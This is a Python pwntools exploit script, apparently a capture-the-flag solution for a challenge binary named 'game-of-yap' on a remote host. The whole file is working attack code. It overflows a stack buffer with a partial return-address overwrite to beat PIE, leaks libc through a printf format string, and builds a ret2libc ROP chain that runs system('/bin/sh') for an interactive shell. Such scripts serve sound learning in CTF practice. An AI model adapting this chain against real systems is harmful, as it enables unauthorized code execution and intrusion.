#!/usr/bin/env python3

from pwn import *

exe = ELF("./game-of-yap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("yap.chal.cyberjousting.com", 1355)

    return r

mov_rsi_into_rdi = 0x0000000000001243
printf_gadget = 0x1299

def main():
    r = conn()
    # gdb.attach(r,"""
    # b *play + 42
    # c
    # """)
    r.recvuntil("...\n")
    
    # First payload to overwrite the last byte of the return addrss (bypass PIE) since the return address included the base address so, we are just changing the last byte to ovewrite the execution to yap function
    payload1 = flat(
        "A" * 264,
        "\x80"
    )
    r.send(payload1)

    # Yap function leaks the play function address so, we can use it to get the base address of the binary
    play_leak = r.recvline().strip().decode()
    play_leak = int(play_leak, 16)
    exe.address = play_leak - exe.symbols['play']
    log.info(f"Base address : {hex(exe.address)}")

    ret_gadget = ROP(exe).find_gadget(["ret"])[0]
    
    
    payload2 = flat(
        "B%27$p", # RSI value (index of the libc-related address at stack)
        "B" * (264 - 6), # Padding
        p64(exe.address + mov_rsi_into_rdi), # Gadget that will copy rsi into rdi 
        p64(ret_gadget), # Stack allignment
        p64(exe.address + printf_gadget),  # Call printf gadget
        p64(exe.symbols['play']), # RBP
        p64(exe.symbols['play']) # Return address to play function to send the libc payload
    )
    r.send(payload2)

    # Getting the libc-related leaked address and calculate the libc base address
    libc_start_main_leak = r.recvuntil("BB").decode()
    libc_start_main_leak = libc_start_main_leak.strip().split("B")[1].split("BB")[0]
    log.info(f" libc start_main : {hex(int(libc_start_main_leak,16) - 139   )}")
    libc.address = int(libc_start_main_leak, 16) -  0x2a28b
    log.info(f"libc base : {hex(libc.address)}")

    # Classic ret2libc
    libc_ROP = ROP(libc)
    bin_sh = next(libc.search("/bin/sh\0"))
    pop_rdi_rbp = libc_ROP.find_gadget(["pop rdi"])[0] 
    pop_rsi_rbx = libc_ROP.find_gadget(["pop rsi"])[0]
    pop_rdx = libc_ROP.find_gadget(["pop rdx"])[0]

    payload3 = flat(
        "A" * 264,
        p64(pop_rdi_rbp),
        p64(bin_sh), # RDI value (first argument to system) -> address of /bin/ss
        p64(0), # RBP value -> any (Just a gadget side effect)
        p64(pop_rsi_rbx),
        p64(0), # RSI value (second argument to system) -> 0
        "B"*8, # RBX  value -> any (Just a gadget side effect)
        p64(pop_rdx),
        p64(0), # RDX value (third argument to system) -> 0
        p64(libc.symbols["system"])

    )
    r.send(payload3)


    # good luck pwning :)
    r.interactive()


if __name__ == "__main__":
    main()